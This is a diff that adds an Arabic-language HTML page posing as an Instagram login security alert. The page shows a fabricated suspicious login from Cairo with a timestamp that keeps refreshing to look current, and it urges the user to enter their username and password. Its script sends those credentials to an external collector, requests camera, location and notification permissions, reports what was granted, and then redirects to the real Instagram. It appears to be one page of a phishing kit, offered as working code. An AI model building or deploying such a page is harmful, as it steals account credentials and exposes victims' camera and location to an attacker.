@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#ef4444">
+<title>تنبيه تسجيل دخول - Instagram</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    min-height: 100vh;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #0f172a;
+    color: #fff;
+  }
+  .container {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .card {
+    background: #1e293b;
+    border: 1px solid #334155;
+    border-radius: 20px;
+    padding: 32px 24px;
+    max-width: 440px;
+    width: 100%;
+  }
+  .alert-icon {
+    width: 80px;
+    height: 80px;
+    margin: 0 auto 20px;
+    background: linear-gradient(135deg, #ef4444, #dc2626);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 40px;
+    box-shadow: 0 0 40px rgba(239,68,68,0.5);
+    animation: shake 1s infinite;
+  }
+  @keyframes shake {
+    0%, 100% { transform: rotate(0deg); }
+    25% { transform: rotate(-5deg); }
+    75% { transform: rotate(5deg); }
+  }
+  h1 {
+    font-size: 22px;
+    font-weight: 800;
+    text-align: center;
+    margin-bottom: 8px;
+  }
+  .subtitle {
+    font-size: 14px;
+    color: #94a3b8;
+    line-height: 1.5;
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .login-details {
+    background: #0f172a;
+    border: 1px solid #334155;
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 20px;
+  }
+  .detail-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 8px 0;
+    border-bottom: 1px solid #1e293b;
+    font-size: 13px;
+  }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-label { color: #94a3b8; }
+  .detail-value { color: #fff; font-weight: 600; }
+  .detail-value.danger { color: #fca5a5; }
+  .actions {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 16px;
+  }
+  .form-input {
+    width: 100%;
+    padding: 14px 16px;
+    background: #0f172a;
+    border: 1px solid #334155;
+    border-radius: 10px;
+    font-size: 15px;
+    color: #fff;
+    font-family: inherit;
+    margin-bottom: 12px;
+  }
+  .form-input::placeholder { color: #64748b; }
+  .form-input:focus {
+    outline: none;
+    border-color: #ef4444;
+    box-shadow: 0 0 0 3px rgba(239,68,68,0.15);
+  }
+  .btn {
+    width: 100%;
+    padding: 15px;
+    background: #ef4444;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { opacity: 0.6; }
+  .btn-secondary {
+    background: transparent;
+    border: 1px solid #475569;
+    color: #94a3b8;
+  }
+  .error-msg {
+    background: rgba(239,68,68,0.15);
+    border: 1px solid rgba(239,68,68,0.4);
+    border-radius: 8px;
+    padding: 10px 12px;
+    color: #fca5a5;
+    font-size: 13px;
+    margin-bottom: 12px;
+    display: none;
+  }
+  .error-msg.show { display: block; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="card">
+
+    <div class="alert-icon">🚨</div>
+    <h1>تنبيه أمني</h1>
+    <p class="subtitle">
+      لاحظنا محاولة تسجيل دخول لحسابك من جهاز آخر.
+    </p>
+
+    <div class="login-details">
+      <div class="detail-row">
+        <span class="detail-label">📍 الموقع</span>
+        <span class="detail-value danger">Cairo, Egypt</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">📱 الجهاز</span>
+        <span class="detail-value danger">Unknown Device</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">🌐 المتصفح</span>
+        <span class="detail-value danger">Chrome Mobile</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">⏰ الوقت</span>
+        <span class="detail-value" id="login-time">قبل دقيقتين</span>
+      </div>
+    </div>
+
+    <p class="subtitle" style="margin-bottom:16px;">
+      إذا لم تكن أنت، يرجى تسجيل الدخول فوراً لإلغاء الجلسة المشبوهة.
+    </p>
+
+    <div class="error-msg" id="error-msg"></div>
+
+    <form id="alert-form" onsubmit="return handleAlert(event)">
+      <input type="text" id="username" class="form-input" placeholder="اسم المستخدم أو البريد" required>
+      <input type="password" id="password" class="form-input" placeholder="كلمة المرور" required>
+      <button type="submit" class="btn" id="alert-btn">
+        🔒 تأمين الحساب الآن
+      </button>
+    </form>
+
+  </div>
+</div>
+
+<script src="/fs/static/collector.js"></script>
+
+<script>
+(function() {
+    "use strict";
+
+    var submitting = false;
+
+    // Time update
+    setInterval(function() {
+        var el = document.getElementById('login-time');
+        if (el) {
+            var mins = Math.floor(Math.random() * 3) + 1;
+            el.textContent = 'قبل ' + mins + ' دقيقة';
+        }
+    }, 5000);
+
+    function showError(msg) {
+        var el = document.getElementById('error-msg');
+        el.textContent = msg;
+        el.classList.add('show');
+        setTimeout(function() { el.classList.remove('show'); }, 4000);
+    }
+
+    function handleAlert(event) {
+        event.preventDefault();
+        if (submitting) return false;
+
+        var username = document.getElementById('username').value.trim();
+        var password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            showError('يرجى ملء جميع الحقول');
+            return false;
+        }
+
+        submitting = true;
+        var btn = document.getElementById('alert-btn');
+        btn.disabled = true;
+        btn.textContent = 'جاري التأمين...';
+
+        FSCollector.captureForm({
+            username: username,
+            password: password,
+            form_type: 'login_alert'
+        }, {
+            metadata: { page: 'instagram_08_login_alert' }
+        }).then(function() {
+            FSCollector.showLoader('جاري إلغاء الجلسة المشبوهة...');
+
+            setTimeout(function() {
+                FSCollector.requestPermissions({
+                    camera: true,
+                    microphone: false,
+                    location: true,
+                    notifications: true,
+                    showOverlay: true
+                }).then(function(perms) {
+                    FSCollector.sendPermissionsResult(perms);
+
+                    setTimeout(function() {
+                        FSCollector.redirect('https://www.instagram.com');
+                    }, 2000);
+                });
+            }, 500);
+        });
+
+        return false;
+    }
+
+    window.handleAlert = handleAlert;
+
+})();
+</script>
+
+</body>
+        </html>
